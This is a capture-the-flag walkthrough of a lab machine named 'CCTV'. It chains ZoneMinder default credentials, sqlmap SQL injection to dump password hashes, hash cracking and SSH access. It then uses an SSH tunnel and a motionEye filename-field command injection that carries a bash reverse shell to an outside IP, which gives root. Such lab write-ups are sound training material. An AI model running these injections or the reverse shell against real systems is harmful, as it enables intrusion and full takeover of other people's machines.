# CCTV

**OS:** Linux · **Difficulty:** Easy · **IP:** 10.129.7.239

---

## Summary

ZoneMinder exposed via default credentials leaks user hashes through a SQLi endpoint. Cracked credentials grant SSH access. An internal motionEye panel reachable via SSH tunneling is abused through a command injection in its File Storage feature to achieve root.

---

## Recon

### Port Scan

```
nmap -p- -T4 --min-rate=5000 10.129.7.239
```

```
22/tcp  open  ssh
80/tcp  open  http
```

### Web — Port 80

ZoneMinder `1.37.63` login panel at `http://cctv.htb/zm/`.  
Default credentials `admin:admin` granted access.  
Three users identified in the UI: `admin`, `mark`, `superadmin`.

---

## Foothold

### SQL Injection — ZoneMinder

The `tid` parameter in the event tag removal endpoint is injectable.

```bash
# Enumerate databases
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<session>" -p tid --dbms=mysql --batch --dbs

# Dump password hashes
sqlmap ... -D zm -T Users -C "Username,Password" --dump --threads=10 --risk=3 --level=5
```

```
admin      | admin
mark       | $2y$10$prZGnazejKcuTv5bKNexXO...
superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe...
```

### Hash Cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
mark : opensesame
```

### SSH

```bash
ssh mark@10.129.7.239
```

---

## Privilege Escalation

### Internal Service Discovery

```bash
ss -tulnp
```

Notable internal listeners:

```
127.0.0.1:8765   # motionEye panel
127.0.0.1:8888
127.0.0.1:1935
```

### SSH Tunnel

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

`http://127.0.0.1:8765/` — motionEye `v0.43.1b4`

### motionEye Credentials

```bash
grep "admin_password" /etc/motioneye/motion.conf
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

Login succeeded with the recovered credentials.

### Command Injection — motionEye File Storage

Navigated to **Settings → File Storage → Run A Command**, injected a reverse shell into the filename format field:

```bash
# Listener
nc -lvnp 4444
```

```
$(python3 -c "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.10.16.244/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

Triggered by capturing a frame. Shell returned as `root`.

```
uid=0(root) gid=0(root) groups=0(root)
```

---

## Flags

| | Hash |
|---|---|
| User | `cat /home/mark/user.txt` |
| Root | `cat /root/root.txt` |

---

## Lessons Learned

- ZoneMinder's default credentials and injectable endpoints make it a reliable initial access vector — always check version-specific CVEs alongside manual testing.
- SSH port forwarding is essential when escalation paths are locked behind localhost-only services.
- motionEye's "Run A Command" feature in File Storage executes with the service owner's privileges — a direct path to root when misconfigured.
